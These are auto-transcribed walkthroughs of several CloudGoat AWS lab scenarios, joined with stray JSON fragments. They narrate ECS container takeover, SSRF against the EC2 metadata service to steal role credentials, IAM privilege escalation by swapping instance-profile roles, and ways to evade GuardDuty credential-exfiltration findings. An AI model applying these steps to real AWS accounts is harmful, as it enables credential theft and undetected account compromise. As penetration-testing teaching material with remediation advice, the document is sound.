Dash identity profile priv d and we see that this is the role associated with this container if we compare that to ec2 we see it s a different role ECS agent so there s two different uh roles here at least within the environment and they each have a different set of permissions most likely now a very common permission policy there s a very common ECS policy that s attached to ec2 instances when dealing with ECS we just call an ECS instance so let s see if there s any if there s IAM permissions associated with this new priv D profile that we have so list Dash roles profile prove d and we cannot do that so what about list Dash uh policies can we even list the policies within the environment no we cannot so I guess we cannot do that with uh private D how about ec2 we can t and list Dash roles also can t so uh we will check that out later in this video but let s just continue with what we do know so when we did ec2 describe Dash instances with our ec2 profile it did not work uh let s do region us-east1 uh yeah it said it did not work we do dash dash force and what about priv D can we do it with priv d we are also not authorized so we can t do it with priv d and ec2 so we need to somehow find uh some privileged escalation pathway with just knowing this let s go back here and look at this output so we have Docker PS um we have here main this is the vom site and we have this this um privileged container so let s try let s try figuring this out so can we list any clusters here so ECS listed as clusters profile priv D region us-east1 and we can list the Clusters so we see there s two different clusters here there s the default one and there s this ECS take over uh cluster so let s do AWS ECS list Dash tests profile priv D and we need to specify the cluster here otherwise I ll just go to this default cluster this is the one that we re interested in this ECS cluster here and we need to provide the region of us-east-1 so we see there are four different tasks here let s look at the different task definitions though so ECS describe Dash tasks and we need to input the tasks so let s go back here let s put all the different tasks and see what the output is so let s put this one this one and all of these and the reason we re doing that is just to see the differences between each task are they configured differently maybe they each have some sort of different permissions involved uh roles who knows so uh dash dash region profile priv d an error occurred identifiers for cluster your cluster is defaults and I also need to input a cluster here one of the very annoying things with ECS is you end up with these huge commands uh but that s just the nature of ECS it s sort of a harder service to try to take advantage of so we have this cluster and let s go back up here with the different clusters let s input this and we get the output of all of our different uh tasks so we see here we have huge output so we have privd here within this container instance Arn starts with the e4f we have pre so we have priv D we have Von site we saw those within the docker socket we have vault which we did not see and there was one more and yeah privity so this Vault one is the one that s most interesting because that s one that we did not see actually within our container instance let s go back to uh that output here it s a little better within C aws s sea lion tool so we can go to all of the ECS tasks that we ran if we do grep Dash R container or was it think container instance is what it is container instance and let s grab Dash r no it was oh probably Dash I uh so we see here there are only two different container instances so we saw four tasks but only two container instances so it s likely that there s two different ec2 instances that are being used to contain these containers but we re only inside one ec2 instance so we cannot actually describe the instances because apparently we do not have those permissions but there s likely two instances right now and there might even be more that we don t know about so a very interesting thing within ECS is that if you take a task and you drain it then the task will just go to a different container instance and continue running and we can see that with AWS ec2 if we go to describe Dash test definitions ECS describe task definitions describe or without the S here definition we can see each task definition and see how that task is defined so if we go AWS ECS list Dash task definitions profile priv d region of us-east-1 so we see an output of four different tasks we tasks we have privy site in web app so the interesting one is the Vault here but let s describe all the different task definitions so we have privd here give it a profile of priv d and region of us-east-1 I might need to specify the cluster yeah so cluster what was its well where did I put the cluster see cluster here uh copy like this let s go back here cluster like that and put that in unknown options maybe I should read the uh errors that are outputted so let s see what the error is an error occurred user does not authorize form on resource star because no identity policy allows that so describe Dash test definition maybe we just can t run this command um yeah so we re going to look at this a little bit uh late actually you know what I m gonna I m gonna cheat here a little bit just for sake of explanation let s do our Cloud go profile which has administrator access so if we look here we see that this is the task roll Arn so there s a role attached to this task and if we go to some other task uh so some other task definition let s do a vault here let s see what the test definition is for that and let s also see the task definition for Vons site so we have Von site that s the one that we compromised and we don t see a role that was attached to this task so if let s kind of verify that here really quickly so if we do um back here where where s our reverse shell our reverse cell died uh let s spin that up again so our container is this one right here now if you remember there was this environment variable called AWS container credentials relative URI so if we put that in here let s see what output we get and we don t get any output and the reason for that is because there is no role attached to this task so it s quite a low privilege task you could say I mean it doesn t even have any role attached to it but this priv D1 is high privileged because there is a rule attached to it and at least it can query the ECS service I don t know if high privilege is the right term but I think you know what I mean so let s look at this Vault one here really quickly so volt does not have any role attached to it but maybe within this this container there s some interesting information now this is just a CTF so all we need is a flag and actually we get the flag right here Echo flag one two three four six seven seven so we don t even need to get inside of this container but I did cheat with this by putting the administrator profile here so let s actually just uh get this container really quickly and so what we need to do is to drain this task and what we can do that with AWS ECS update Dash container instances Dash State dash dash cluster and now we need to specify our cluster so let s go to awcline what was it again this is one of the best things about this this tool is that you don t have to keep on running the same commands over and over if you do grip this R cluster here we go this is the cluster oh wait no that s the container instance let s do dash dash cluster like this and put like that and here we have it so that s this cluster profile of priv D and we want to drain it and we also want to specify what container instance we actually want to to drain so container Dash instances and if we go here what was the container instance describe Dash tasks dot txt we go to volts so volt had which container had this container instance now if you remember this is a different container instance than our volume site if you go to volunt site it starts with let s see it starts with E8 or e4f which is different than the zero uh that that zero AE that the Vault started with so let s drain this container instance so that it goes to the container instance that we already compromised so just drain that uh oh gotta put status draining and specify the region of us that she s dash one see how big this command is so um an error occurred ax is denied we get an X is denied let s do it for dash dash Force so profile priv d uh because no identity based policy allows the ECS update container instances state that s interesting uh let s see can we do that with the ECS profile I mean the ec2 profile and we can do it with the ec2 profile so just from that I have a high suspicion that the ec2 profile the or the agent what was the roll called it was AWS or cdawc lion it s the easiest takeover I think it was agent something like that grip roll and we get a whole bunch of junk here uh what what was that rule called ECS agent here we go user assumed role ECS takeover ECS agent so this is the instance ID of this ec2 instance so I have a high suspicion that the instance profile has the role the policy of that role is Amazon ec2 container service for ec2 role and that s just a really common policy to attach to your ec2 instances so that you can perform these ECS tasks I m just going to cheat once again I mean I I wouldn t really call it cheating I mean it s a so if you do get that policy um of this uh policy name actually we probably need to specify the policy Arn so let s do AWS IAM list policies and then grep this so if we had some sort of Target environment uh this profile of cloud go if we had some sort of uh Target environment then we could just do that within our own environment so it s not really cheating uh because we could just do it within our own environment and see for ourselves so AWS IEM get this policy policy Arn profile of cloud go and we see that V6 is the default version let s get that version get this policy Dash version and so these are the permissions associated with this service role policy managed policy so we can see that we can de-register container inch instances discover pull endpoint create a cluster so it s likely that we have all of these permissions with our ec2 profile that we configured into our AWS CLI so anyways we drained this container instance um so let s see if it s now within our container instance that we compromised so let s get this reverse show really quick do Docker PS and it seems like there s a larger output here let s see this is the new uh container instance now and this is the Vault that s now running on the ec2 instance that we compromised well actually technically we re inside of a Docker container but the docker socket of the host is mounted onto this container so we can see all the different Docker containers uh so now we can try to exec some commands into here Docker exec sh-c who am I and we can see that it works uh so the goal of this scenario is just to cat the flag that s uh inside of this container so let s just get that flag Docker exec sh-c cat flag Dot txt and we can see that this is the flag right here so there s a couple of things to look into this uh first of all mounting the docker socket into a of the host into a container is not recommended there are security risks involved in that so if you don t mind that the docker container gets rooted and because of that a user can access the host machine as well as other Docker containers if if that s not of concern then that s okay but likely it is of concern and you don t want a user to be able to break out of their own container and also to execute commands into other containers so because this was a privileged container and it was you have access to all the different Docker containers that the host has access to then you can easily query other containers such as this Vault container this privileged container and and so forth so now that we completed the scenario now let s look at the role that s attached to the privileged container as well as what the instance profile is that is associated with this ec2 instance uh so first of all let s look at this uh privileged container so if you do AWS uh describe Dash task definitions actually we already ran that let s go to awcli uh sea lion prove D ECS and what was its uh describe Dash tasks dot txt if you look at the role is it like this what was it priv d uh what was the role Arn oh that was in described task definitions describe Dash test definitions and no it did not work so let s let s do that with Cloud go so AWS um ECS describe Dash test definitions profile of cloud go which is the administrator access user that I have and let s specify our region of us-east-1 and the task definition actually we ran that so let s go that into Cloud go here ECS I m forgetting which profiles I ran what so uh let s go to roll so this is the privileged uh role that we have so let s go here AWS IAM list Dash attached role policies profile Cloud go and with this role Arn old name is what we need right so let s go roll name and this is the policy so let s get this policy get Dash policy profile Cloud go dash dash policy Dash Arn and it s misspelled Cloud goat there it helps to uh be able to spell so there we go Cloud go works this is the default version so this is the version being used so let s get that version version ID V1 get Dash policy Dash version and these are the different permissions that we can actually do one of them is list attached role policies did didn t we try that and we got an access denied error I feel like we tried that but anyways get role policy list Dash attached role policies we can list tasks get the policy version um and yeah so this is the privileged uh permission so now let s look at the instance profile so if we look at list Dash uh roles profile Cloud go we can see the other role name which is this one ECS takeover this is the ECS agent role that was associated with this instance so AWS IAM list Dash attached role policies role name and let s profile of cloud go and just as we suspected that is the policy name this Amazon ec2 container service for ec2 role so this is actually the policy of that rule which was attached to the instance profile being used by the ec2 instance that we compromised so uh one other thing we could do is check out the other ec2 instances uh within this AWS account because we saw that there were two different container instance Arns one that had the Vault container that we drained and the other one was the one that we compromised so let s do ec2 describe Dash instances profile of cloud go region u s Dash east-1 and so we see there is this one with a public IP address of 54 165 this is the public DNS name what was our public DS DNS name 54 175 87 which is different than this 54165-224 so ours was the one up here 54 175 the 87 so this was the other ec2 instance that had the volts container instance and so we were able to actually access that container instance by draining it and causing it to be mounted onto the ec2 instance that we compromised so anyway thank you for watching and I ll see you in the next video actually one more thing I m I m really curious to see what guard Duty looks like so let s check that out so let s go here guard Duty uh and um yikes yeah it s not looking too good we see uh unauthorized access instance credential exfiltration lots of findings here also from my previous uh videos this is the ec2 ssrf we didn t run this in such a stealthy manner we didn t create our own sneaky endpoints instance we also ran axis denied calls although that s not shown here so not too stealthy but that was not our goal anyways so anyways thank you for watching and I ll see you in the next video Music foreign",

      "content"  : "hello everybody this is your day and this is the ec2 ssrf scenario in Cloud go it s quite a straightforward scenario you just start off as a low privileged IAM user who only has read access to Lambda functions and once you list functions you find that there s an access key and secret access key in the Lambda environment variables so you just take that access key in secret access key you configure it into a new profile which has ec2 access to describe all instances so then you find one instance that has a web application open it is vulnerable to an ssrf vulnerability which allows you to query the metadata service and obtain the role for the instance profile so once you get the credentials for that role you could then enumerate the S3 service to find that there is a secret S3 bucket containing the credentials of an admin user this admin user has the permissions to invoke a Lambda function which basically concludes the whole scenario so let s check it out we were provided the access key and secret key so as usual let s start with configuring our profile AWS configure dash dash profile Solus and let s put in the access Keen secret key and after that let s also configure our AWS C lion engagement so set engagement ec2 ssrf and now that we completed the configuration part let s start by enumerating Solace IAM permissions the reason we re going to start with the IEM service is because that s the juiciest service that s the one that contains the most misconfigurations and also this isn t this is a Solus this is an IAM user so that s another reason it s very likely that this user has IAM permissions so let s start off with listing the attached user policies of this user of this user and let s do AWS STS get Dash caller Dash identity dash dash profile Solus and this is the username so let s just put that in there and provide the profile of Solus and we are not allowed to run that call uh could we even list the users probably not let s see profile Solus and we can t how about the ec2 service can we do anything with that describe instances the profile of Solace and region us-east-1 again we cannot do that uh what about Lambda functions profile Solus and also provide the same region and that we do so we do have Lambda permissions and as we can see here we re also given an access key and secret key now that was quite straightforward to list the functions but suppose it was a less straightforward service there s also this tool called enumerate IAM and you can just install it from GitHub so Python 3 enumerate IAM dot Pi we could provide the axis key and the secret key so the axis key is right here and the secret key and what this will basically do is just brute force uh the all the permissions it ll just do read API calls to make sure that the AWS environment does not get modified so now it s just brute forcing all these different permissions um while that runs let s look at this axis Keen secret key and configure it into our profile so configure let s call this profile ec2 and provide the access key and secret key so now let s use STS get Dash caller Dash identity profile ec2 and we see that this is another user uh with this strange name Rex let s see if this user can do any ec2 commands as this says ec2 access key so ec2 describe Dash instances profile of ec2 and we must specify a region U S Dash east-1 and we can there is one instance here with this private IP address and this public IP address so let s take a look at this curl it and it says URL must be a string not undefined so seems like it s looking for some sort of parameter maybe a parameter called URL so let s do URL equals test and it says a different uh error now it says welcome to sethsex ssrf demo I want it to be useful but I could not find test for you so just from the hint of this scenario it says ssrf and that s quite a huge hint that maybe it s some server-side request forgery vulnerability in which you can query the metadata service so let s do that with 169 254 169 254 and we can let s do latest metadata I am security Dash credentials and we see the instance profile role let s just put that in there and now we can configure this new profile let s call it ssrf put in the axis key this secret access key and also the token so let s configure that almost went into my AWS credentials there so session token equals this and let s put it into Music AWS credentials so now asts get Dash Color dash identity profile ssrf this should work and we see it does this is the assumed role before enumerating the permissions of this user let s go back to that Lambda function that we saw earlier when we listed it so we saw that we were able to list the functions here what if we were able to get the function to get the source code of it so let s do AWS Lambda get Dash function and let s put in the function name function name and the function name is this we also need to put in our profile of was it Solas I believe yes it was Solas and our region of us Dash east-1 and we can get it so let s go here go over here paste that in and do save by the way this is the GitHub for that enumerate IAM tool you can you can find it right here so we have it downloaded uh I did not check where I downloaded it was it in the downloads file no it was not let s see show in folder uh oh it s right here cool so exit LS here it is so let s make a source directory just in case if we were to unzip this file as it is right now it s possible it will just clog up our directory so let s just uh unzip it here on zip and we see there is a function called Lambda dot Pi or a script called lambda pi and it does nothing all it does is it says you need to invoke this function to win so it s just a CTF so it does nothing interesting we need to invoke it can we invoke it with the Solace user so later WS Lambda invoke function name what is the name of the function it was this provide our profile of Solus again region of EOS Dash east-1 and out txt and we can t maybe we could do this with our ssrf user AWS Lambda invoke um with profile of ec2 nope what about the ssrf also can t so we can t do it with the ssrf ec2 and Solus user but we do have this new ssrf user so because this is a web application we got this ssrf from some web application and web applications typically talk with S3 buckets because it s very common that you re running some web application and you need to serve files coming from an S3 bucket so let s enumerate S3 with this profile of ssrf and we can see that there are three buckets here this is just the cloud formation template I have in my account and this is cloudtrail so let s look at this one this is one from the scenario so AWS s3ls put here put our profile of ssrf and we see that there s admin Dash user txt so let s copy that let s just put in the recursive file because I m too lazy to put slash admin Dash user txt just copy that here and here we have admin Dash user txt and this looks like an access key and a secret key so let s configure that profile admin X is key and the secret key so with this user I m assuming it has administrator access so let s see what happens if we just do a list Dash users profile admin and we don t have that we don t have administrator access because we have an access denied from that but this scenario says that you have to invoke the Lambda function in order to win so maybe the goal is not necessarily to escalate to administer to access but rather to just invoke that function so let s go back here where we invoked it and instead of putting the profile of Solus let s put the profile of admin and it looked like it looks like it worked and it says you win so that s basically this whole scenario it was just a vulnerable ec2 instance and a couple of misconfigurations such as putting an access key in secret access key into Lambda environment variables which allowed us to escalate privileges eventually to this admin user who has the ability to invoke Lambda functions and I almost forgot to show the output of this tool so let s check it out so we see that we have Lambda a couple of Lambda permissions that we could do one of them is Lambda list functions so you could just do that with every single user if you don t want to manually test each service and that s how you can find a pathway but just know that this is very noisy and if you look at the cloud tray logs it s just filled with tons of access denied calls so anyway thanks for watching and I ll see you in the next video Music foreign",

      "content"  : "hello everybody this is your day and this is the IAM privice by attachment scenario in the cloud good series we start off as a user who s actually not that low privileged he has the IAM pass role permission that notorious permission that we used also in the Lambda prevask video as well as a mini IAM and ec2 permissions among those IAM permissions are adding a role to an instance profile removing a roll from an instance profile and with the ec2 permission we can run an instance so we can create an instance and perform all kinds of different commands in this scenario we are able to remove a low privileged roll from an instance profile and add a high privilege role to that instance profile using that modified instance profile we can create a new ec2 instance and after sshing into that ec2 instance we can query the metadata service to obtain the credentials for that role and completely compromise the AWS account we were provided the access key and secret key of a user so let s just configure that into our AWS CLI but before doing that I m running a tool called AWS C lion so let s configure that first with awcline dash dash set Dash engagement and we ll call it IAM previsc by attachment this tool is made to keep your pen tests your AWS pen test efficient stealthy and organized I ll show this tool off um as we go further into the video so let s configure this profile we ll call it Kerrigan and put in the access key and the secret key and that s it and one of the really cool things about this tool is you can change your user agent so before running any API calls let s make sure we change our user agent because we re running within a parrot terminal so I installed this tool in opt AWS C line and here we get some sample user agents I m going to choose let s choose this Windows votes or core user agent so any API call that we see in cloudtrail will actually be this Windows user agent so we could do that with AWS client set user agent and just put in our user agent as well as our engagement which is IAM previous by attachment so now we have this user agent we can see any user agent that we configured in this directory so if we go to dot AWS client this is all of our engagements we have a default engagement the one that we just created and all of our API calls will be saved within this engagement so we ll see that as we go further into the video you could also see all the different engagements with this command so now that we configured this profile of Kerrigan we should start running some API calls so one of the first API calls that I run when I don t know anything about a user is to see if they can run some IAM service API calls so for example IAM list Dash attach Dash user Dash policies and then provide the username now we can assume that the username is Kerrigan and just reduce the amount of API calls that we are doing that we are performing but just to make sure we could also do this get Dash caller Dash identity command so we provide this with Kerrigan and as expected we this is our username so we could put in Carrigan here profile of Kerrigan and we are not allowed to we get an access denied error and so this is very bad when you re running a penetration test and the client wants you to be stealthy and you run an access denied call that s all access denied calls are quite noisy so you want to make sure that you avoid the the access denied calls so another thing that we can try doing is seeing if we can assume any roles so we can list the roles and provide our Kerrigan profiles and we see that these are the roles there s a ton of roles here I think there s nine in total in my AWS account but the interesting ones are the CG Meek roll and the mighty role we can assume that the mighty role has more permissions than the meek role just because of its name it s mighty versus Meek uh we see that the ec2 service can assume this role for both roles and because of that we should look at to see if we can run any ec2 commands because if we can create an ec2 instance and use this role with that instance then we can escalate our privileges this is kind of similar to a previous video that I did with a vulnerable with a Lambda previsque um I ll put that video in the link a link to that video in the description below basically what we did with that scenario is we created a Lambda function and we passed a role to that function we re gonna be doing something quite similar here so if you do AWS ec2 describe Dash instances profile Kerrigan let s just see if we can even run any API ec2 API calls so let s provide our region and we see that we have one instance here with this public IP address and this private IP address let s see the security groups so there s an SSH Security Group and an HTTP Security Group so I assume that we can SSH into this machine and maybe as an HTTP server as well that we could potentially exploit so let s do curl http and it just hangs uh it s there s likely uh some Security Group there that s stopping our API call we can check that out later in the video uh but um if you can t curl the HTTP server let s see if we can SSH and we can it is open uh so we can do that ec2 call maybe we can also create an ec2 instance and so we could do that if you re unsure about the command you can do AWS ec2 help and you can look at all the different API calls you can do in the ec2 service the one that we re interested in is the Run Dash instances API call this API call will allow you to create an ec2 instance and so let s do AWS ec2 run Dash instances help and these are all the different parameters that we can specify with this API call so let s do AWS ec2 describe Dash instances again so that we can get the image ID I m just going to use the same image ID as I as the other ec2 instance there so profile Kerrigan and again us that s East S1 now a really cool thing about this AWC lion tool is that it detects that I already ran this command before and instead of passing this API call to the AWS account that you re targeting it reads it from memory so this API call that I just ran did not get duplicated in cloudtrail it just reduces your API call footprint in the account that you re targeting it s also really fast because I read it from memory and I didn t have to wait for the API call to be performed so this is the image ID and the instance ID so let s just take this image ID here so AWS ec2 run Dash instances Dash Dash image Dash ID let s put this in dash dash instance type now this is not that important to specify uh it doesn t really matter what instance type you use I m going to use a micro instance type and that s just so that it reduces the cost to my AWS account I believe the default is M1 dot small so then we could provide a key name and before providing a key name we need to actually create a key so let s look at how to do that so we have AWS ec2 help put in key and we see that there s an API call there called create Dash key pair so let s create a key pair AWS ec2 create Dash key Dash pair and then provide a key name so this key name could be really anything I m going to just choose tests and we could put the output as text and provide our profile of Kerrigan and the region of usds East S1 so here is our private key we can just copy this and to test Dot pem set paste put all of this in and we re good WQ and now we have this key pair in the ec2 service so now when we provide a key name we could do test and what else do we need we have Security Group IDs let s specify those because we want to be able to SSH into this instance so let s use the same Security Group as this instance here so if we go down we have the SSH Security Group this is all we don t need the HTTP Security Group and let s see what else IAM instance Dash profile right here this is the very important parameter that we re going to need to exploit this vulnerability this misconfiguration with this this is basically how we re going to do this roll pass so we need to specify an instance profile but we don t know yet with the instance profile name is so if we go here we need to run another ec2 API call to list the instance profile actually this is an IAM list instance profile dash dash profile carrying and so now we can list all the different instance profiles we see that there is only one at the moment called Meek instance profile and it s given the meek role so if we were to attach this profile instance profile to our ec2 instance we won t get as many permissions as we would if we attach the mighty instance profile we don t need to change this instance profile name or anything about it the really important part here is this role right here so what we need to do is just remove this roll so if you can do that with AWS IAM remove dash roll from instance profile and we provide the instance profile name so let s copy this put it in and we can provide the role name which is this and so this is what we re going to need to remove so that we can then put in our own profile I could show you what it looks like if we don t do that so let s just add our own role to this instance profile without removing first the previous role so let s put in our roll instance profile name and we put this in and then provide our role name of the mighty role so let s go back here let s go to AWS sea lion IAM and Kerrigan is our profile and look at let s look at all the IAM commands that we ran so we have this list Dash rolls txt so let s do less Dash rolls and this is the output of the commands so it s the here s the meek roll and here is the mighty roll so let s copy this and put it here to remove that roll I mean to add that role and provide our Kerrigan profile and we get an error saying the limit exceeded when calling the add roll to instance profile operation cannot exceed quota for instance session for instance profile one so we cannot have more than one role for a given instance profile and so that s why we need to First remove this rule of the meek role and then put in our own role so we get a validation error uh this role and instance profile failed to satisfy constraint so they want an Arn and I gave just the role name so let s put this whole part I ll just copy this here now um you still get a validation error dash dash roll Dash name the specified value for role name is invalid did I copy that wrong let s erase it oh it s uh says already executed command so I added this dash dash Force here at the end this is just another C line parameter to make sure that you can run the same AP I call multiple times so it says that this at instance profile name failed to satisfy constraints oh I put a tilde there by accident now we can delete that profile just a little typo there so now let s add that role name that uh mighty roll and again we need to put dash dash Force at the end to allow the seed lion tool to run it twice so now when we look again at the instance profile dash dash Force we can see that we have the mighty role attached to this instance profile so now let s copy this instance profile and put it here and although the instance profile says Meek the the high privileged role is attached to it so with this command now let s see if there s any other parameters that we should specify one other parameter that we should specify is to provide a public IP address so that we can then connect to this instance via SSH so let s associate a public IP address to it and that looks to be about it so let s run this command and provide a profile of Kerrigan so it said expected an equal sign received end of file for this input now I put a instance I put a instance profile name so let s do name equals this and now we should specify a region us that s East one and an error occurred Security Group and subnet belong to different networks so let s also put the same subnet as the other instance so if you look here subnet this is the subnet that we re going to want to use dash dash subnet Dash ID and put that in and finally we were able to create our ec2 instance by the way notice how in the metadata options HTTP tokens is set to optional now typically when you run an HTTP server for an ec2 instance you want to set this to required and the reason you want to set that to required is because if you look at the previous video of cloud breach S3 we were able to exploit an ec2 instance because HTTP tokens was set to optional so right now this ec2 instance is setting up and we just need a weight let s describe the instances in this account and see if it is up yet so Kerrigan and provide our region of us-e-one and because this is running from memory it will not see our new instance so let s do dash dash Force and here is our previous instance and this here up here is our new instance so this is the public IP address it s SSH to it see if that works so it does so let s do test Dot pem Ubuntu at this server now the reason we re doing Ubuntu is because this is an Ubuntu image ID but this is something that s very common with an ec2 instances if Ubuntu does not work then you should do ec2 Dash user and see if that works so this SSH into this and we are now in to this instance so if we want to provide any AWS command we ll we will see that it s not installed yet but we could do we could install it with SNAP installed AWS the CLI and we have to do sudo and also provide classic here so here we can install the AWS CLI so we can configure the credentials of this role into this instance right now I can t run any AWS commands because I don t have any credentials in my AWS credentials file so let s get the AWS role credentials via the metadata so we do this latest metadata and as we can see here we have this IAM endpoint because we have an instance profile role attached to this instance so we do IAM security Dash credentials and we can see the role that s attached to this instance this is the IAM instance profile so now we can configure all these credentials now we could either configure them right here in our home IP address or we can configure that within the ec2 instance now configuring it within the ec2 instance is recommended because otherwise it will be triggering guard Duty with an IAM instance credential exfiltration outside AWS finding I go into depth about that in the previous video so let s configure this and we can call it default this could be just our default profile you can put in our access key our secret access key and also the token so if we go to AWS credentials AWS session token equals this so now we can run all sorts of commands AWS call identity and we have an invalid oh I suppose I put those credentials wrong so let s go back here credentials AWS I misspelled session here session and let s run that again so now we have the API call that successfully ran and now let s look at all the permissions of this role so AWS IAM list attached role policies and we have to provide our role name so let s put that in and we have this role that s attached or this policy that s attached to this rule so let s do AWS IEM get Dash policy Dash version version ID V1 or we don t need to provide a profile since our it s our default profile and we need to provide a policy Arn and we can see that we can perform any action on any resource so we have completely compromised this AWS account by attaching a high privileged instance profile to this ec2 instance role so if we go back and look at the roles we can see why we were able to escalate our privileges so AWS IAM list roles we provide a profile of care again and let s less this output so first of all we allowed any ec2 instance to assume these roles there were no conditions applied at all and for a role that is this highly privileged there should be some conditions applied to not allow any ec2 instance to assume this role furthermore the IAM user that we were provided had quite High privileges if we go back to this SSH instance and we look at our user so AWS IAM list that s attached user policies provide our profile actually or default I m not used to that username of Kerrigan and we see that here s the Kerrigan policy so let s just get this policy version policy version version ID and provide the policy Arn we can see all the different permissions that was allowed for this user we can list roles pass a role associate IAM instance profile we were given all of these permissions and so it would seem that perhaps this is not that high privilege of a user but this user can easily escalate privileges as we just demonstrated so it is important to follow the principle of least privilege and make sure that you re not providing your IAM users with too many permissions",

      "content"  : "hello everybody this is zero day and this is the cloud breach S3 scenario in Cloud go when starting the scenario you will simply provided the ec2 server IP address that you must Target and that's about it it's based off of the an actual scenario that happened with Capital One and how they got breached in 2019 which led to millions of credit cards being leaked we go over how to stealthily pen test an environment and bypass guard Duty findings specifically the instance credential exfiltration findings in the IAM Service as well as how to configure the ec2 metadata Service Such that it is more secure we were provided the ec2 server IP which we must Target so let's just curl this IP and see what response we get so curl this IP and we see that it says this server is configured to proxy request to the ec2 metadata service please modify your request host header and try again so let's just put our host and we're going to put the host as 169.254.169.254 and the reason for this is because this is the magic IP address associated with the metadata service and as it says that the server is configured a proxy request to the ec2 metadata service this is why we put this metadata service IP as the host header value now obviously this is quite insecure because the ec2 metadata service or any metadata service for that matter contains sensitive information such as security credentials so when we curled this IP address with this host header we have the metadata service endpoints that we can then curl so if we do curl slash latest which is the latest endpoint in the metadata service we can see that there's metadata user data and just Dynamic data but we want the metadata so we do metadata and we have all kinds of nice information to look at the most important one is in this IAM folder here as this contains the security credentials so security Dash credentials and then we see the ec2 role that is associated with this instance so when we query this role the output is the axis key secret access key and the token for this role so if we quickly just configure our profile we'll call it ec2 breach put in the access key the secret access key and the token and I'll just do Echo AWS session token equals this put it in the credentials file and so now we can perform commands like the AWS STS get Dash Color dash identity command something like this but the problem with this command is that it triggers alerts because for many reasons first of all we're running on a pen tested distro called parrot OS so our user agent will get logged by cloudtrail and then that will get flagged by guard Duty because it sees that some API call is coming from uh penetration testing operating system and so that is a medium finding by guard Duty to avoid that you could obviously change your user agent but that's not enough because on top of that we're running this command from an IP address that is not that of the ec2 instance it'll see that the source IP address is not this and so a way to get around that uh security researcher by the name of Nick frischetta found that if you create an ec2 instance within a private subnet behind multiple VPC endpoints that you could actually bypass the this guard Duty finding now previous to January 30th 2022 there was a guard Duty finding called instance credential exfiltration dot outside AWS and if we go we could just look that up on uh on Google we'll look at guard Duty findings iam and then we scroll down to the credential exfiltration findings we can see exactly what triggers these findings so we go down to credential exfiltration inside AWS this is the newer finding so let's start with the one that was there before January 30th so this is the original instance credential exfiltration finding by guard Duty and it states that this finding informs you that a host outside of AWS has attempted to run AWS API operations using temporary AWS credentials that were created on an ec2 instance in your AWS environment so this finding gets triggered when it sees that an API call is coming from an IP address that is not owned by AWS so what attackers did before January 30th is they simply spun up an ec2 instance within their own AWS account and only ran API calls from within that ec2 instance that way they were able to bypass this outside AWS finding once AWS found out about this they created a new finding called instance credential exfiltration inside AWS it basically states that if an API call is coming from an 8 from a source IP address that is owned by AWS but is not that of the ec2 instance that it came from if it's not from this exact ec2 instance IP address that you exfiltrated the credentials from then it triggers that inside AWS finding so the way to get around that is there's this tool called sneaky endpoints created by Nick frischetta I'm sure I'm butchering his name but he did great research on this and he created this tool called sneaky endpoints which you can just clone go I put in opt sneaky endpoints and all you have to do is terraform in it when you first download this repository and after you do that you just type terraform apply now this takes a while so I already ran it here you see the it outputs the instance ID the ec2 instance ID which you can connect to with AWS SSM start desk session start desk session Target and then you input the host ID now for some reason with my AWS installation whenever I run this command my shelf just freezes so I'll just connect to this via the browser and so I'll go here and go to ec2 connect to sneaky endpoints actions connect connects and so this way we can connect to the ec2 instance via the browser so I'll just type in bash really quick and this is the internal IP address of the ec2 instance now something really cool about this is that if you look at the cloud trail logs of the API calls coming from this ec2 instance you will not see a public IP address you'll actually just see the private IP address so let's just run a couple of commands so we say we see that we got the credentials from the ec2 instance so now let's put these credentials into this ec2 instance so call it ec2 breach and let's just transfer over the credentials I'll pause the video really quickly and put those in okay so now that I put the credentials in we can continue with our commands so a lot of the times there is sensitive information in S3 buckets so let's just enumerate that with AWS s3ls and provide the profile of ec2 breach and we see there are a couple of buckets these are the cloud trail logs that I've configured in my own environment uh these are the this is the sneaky endpoints bucket that you can use to transfer tools and whatever you would like into this ec2 instance and this is the bucket created by the cloud goat scenario so let's just look at this AWS s3ls and just put that in there and we see nice juicy information with cardholder data primary secondary corporate a really cool thing that you could do is if you want to download multiple file files recursively you could just do AWS S3 copy and put the recursive flag at the end and we downloaded all the files I should probably create a directory for that let's call it maker S3 and do that again and we see all of the files and that that's basically all there is for this Cloud good scenario but let's look at the cloud trail logs to see what that looked like and as well as uh guard duty to see if guard Duty trig if the credential exfiltration findings were triggered so if you look at cloudtrail we'll go to our bucket here our cloud trail bucket we'll refresh we'll see 1234 let's see what was logged then and then we will also see at 12 39 it does it every five minutes so let's just download this and I'll pause the video really quickly and just put all the files in my virtual machine so I transferred the cloudtrail log from 1239 into my virtual machine so let's look at this cloudtrail log and if we remember I think it was the the I the internal IP address for that ec2 instance that we created was 10.0.0.184 so if we look at the cloud trail logs we will see that that actually that IP address actually shows up instead of the public IP address so we see the source IP address is 10.0.0.184 and it's running an SSM command and here is another ssm.amazon AWS but we see whatever command we run from within that instance is 10.0.0.184 and not some public IP address that is not that of the ec2 instance that we compromised because of that you're able to successfully bypass this finding of uh credential exfiltration both inside AWS and outside AWS because those simply look at the public IP address but when the cloudtrail only sees Source IP address being that of a private IP address it simply does not know whether that is outside AWS inside AWS or what it is even maybe it's okay and so this begs the question that maybe AWS should create a new guard Duty finding wherein if the source IP address even if it's an internal IP address if it's not equal to the internal IP address of the ec2 instance that you compromised then there should be an additional finding for that if we look at the AWS instances in this current environment I'll use my Cloud goat account this has administrator access on it if we look at this we see the private IP address at 10.0.0.184 this is our sneaky endpoints instance but if we look at the instance for the cloud go we see that it has this private IP address 10.10.10.35 which obviously is not the same as the internal IP address that we just created so this should be a finding that I believe AWS should create to stop this form of a VPC endpoint credential exfiltration additionally if we look at guard duty to see if it picked up on anything we can see that guard Duty says that we don't have any findings let's refresh simply says root credential usage and that is it that this just has to do with using your root account so there's absolutely no findings at all but if we were to run something like AWS STS get Dash caller Dash identity from my specific IP address which is my home IP address let's say that's just profile ec2 breach we see we are given the output of the API call and if we just wait for a couple of minutes we will see that guard Duty picks up on this and alerts the AWS account of this High finding I'll just pause the video and return once guard Duty finds it so I took a little break but uh coming back to guard Duty we look at all the findings uh we see that here are some findings uh IAM root credential usage finding uh that just has to do with using the root account but other than that we see that there's the unauthorized axis IAM user instance credential exfiltration outside AWS and this is the resource resource from which that was ran um there's multiple different uh findings from previous tests that I ran here's one for S an S3 bucket and there's multiple different findings so how do we mitigate this weakness with metadata in this particular scenario well if you recall we were able to Simply curl the metadata service and just like that we were able to get the metadata but if we were to harden the environment we could do the we can configure the metadata such that it uses imds V2 instance metadata service version 2. and what that is is essentially the same thing as instant submitted data service version one which is what we have running right now except it requires that you 